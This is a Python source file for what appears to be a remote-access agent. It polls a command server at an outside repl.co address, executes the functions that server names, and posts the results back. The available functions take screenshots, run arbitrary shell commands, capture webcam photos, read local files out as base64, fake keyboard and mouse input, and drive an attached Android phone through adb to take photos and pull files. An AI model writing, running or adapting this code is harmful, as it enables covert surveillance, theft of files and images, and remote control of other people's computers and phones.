import requests, pyautogui, base64, io, _thread, time, cv2, uuid
from adb import adb_commands
from subprocess import check_output

myname = "$agentname"
phone = adb_commands.AdbCommands().ConnectDevice()

class Commands:
    click = pyautogui.click
    moveTo = pyautogui.moveTo
    write = pyautogui.write
    press = pyautogui.press
    hotkey = pyautogui.hotkey

    alert = pyautogui.alert
    confirm = pyautogui.confirm
    prompt = pyautogui.prompt
    password = pyautogui.password
    
    def help():
        return [x for x in dir(Commands) if not x.startswith("_")]

    def screenshot():
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, "png")
        return base64.b64encode(buf.getvalue()).decode()
    
    def shell(cmd):
        try:
            return check_output(cmd).decode()
        except Exception as e:
            try:
                return e.output
            except:
                return str(e)
    
    def take_photo(camera_id=0):
        uid = str(uuid.uuid4())
        cam = cv2.VideoCapture(camera_id)
        time.sleep(0.1)
        code, img = cam.read()
        del cam
        cv2.imwrite("%s.png" % uid, img)
        return "%s.png" % uid 
    
    def download(fn):
        return base64.b64encode(open(fn,"rb").read()).decode()
    
    def adb_photo():
        phone.Shell("am start -a android.media.action.IMAGE_CAPTURE")
        oldpics = phone.Shell("ls /data/media/DCIM/Camera").strip()
        phone.Shell("input keyevent 27")
        fn = phone.Shell("ls /data/media/DCIM/Camera").replace(oldpics,"").strip()
        return phone.Pull("/data/media/DCIM/Camera/%s" % fn)

    def adb_sh(cmd):
        return phone.Shell(cmd)
    def adb_pull(fn):
        return phone.Pull(fn)

    

completed = []

url = "https://command.marcusweinberger.repl.co/agents"

def pinger():
    while True:
        try:
            requests.get(url + "/ping?name=" + myname)
        except:
            pass
_thread.start_new_thread(pinger, ())

def do_cmd(cmd, uid):
    print("running command", cmd)
    res = getattr(Commands, cmd['fn'])(*cmd.get("args",[]), **cmd.get("kwargs", {}))
    r = requests.post(url + "/submit", data={
        'name':myname,
        'uid':uid,
        'res':res,
    })
    print("sent res", r)

while True:
    try:
        commands = requests.get(url + "/commands?name=" + myname).json()
        for uid in commands:
            if not uid in completed:
                _thread.start_new_thread(do_cmd, (commands[uid], uid))
                globals()['completed'].append(uid)
    except:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            exit(0)